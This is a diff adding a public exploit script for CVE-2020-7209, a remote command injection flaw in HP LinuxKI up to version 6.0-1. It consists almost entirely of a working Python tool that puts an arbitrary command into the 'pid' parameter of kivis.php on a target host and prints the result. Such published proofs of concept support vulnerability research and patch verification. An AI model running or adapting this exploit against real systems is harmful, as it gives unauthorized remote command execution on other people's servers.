@@ -1,0 +1,40 @@
+Exploit Title: HP LinuxKI 6.01 - Remote Command Injection
+Date: 2020-05-17
+Exploit Author: Cody Winkler
+Vendor Homepage: https://www.hpe.com/us/en/home.html
+Software Link: https://github.com/HewlettPackard/LinuxKI/releases/tag/v6.0-1
+Version: <= v6.0-1
+Tested on: LinuxKI Docker Image
+CVE: CVE-2020-7209
+
+#!/usr/bin/env python3
+
+import requests
+import argparse
+import sys
+import re
+
+def parse_options():
+
+	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
+	parser = argparse.ArgumentParser(description='HP LinuxKI <= 6.0-1 RCE - CVE-2020-7209', formatter_class=formatter)
+	parser.add_argument("-i", "--ip", dest='host', type=str, help="Target Hostname/IP", required=True)
+	parser.add_argument("-p", "--port", dest='port', type=str, help="Target Port", required=True)
+	parser.add_argument("-c", "--cmd", dest='cmd', type=str, help="Command to execute", required=True)
+	args = parser.parse_args()
+	return args
+
+def main(args):
+
+	host = args.host
+	port = args.port
+	cmd = args.cmd
+	path = '/linuxki/experimental/vis/kivis.php?type=kitrace&pid=15;echo BEGIN;%s;echo END;' % cmd
+	rce = requests.get('http://' + host + ':' + port + path, verify=False)
+	output = rce.text
+	a, b = output.find('BEGIN'), output.find('END')
+	print(output[a+6:b])
+
+if __name__ in "__main__":
+	args = parse_options()
+	main(args)
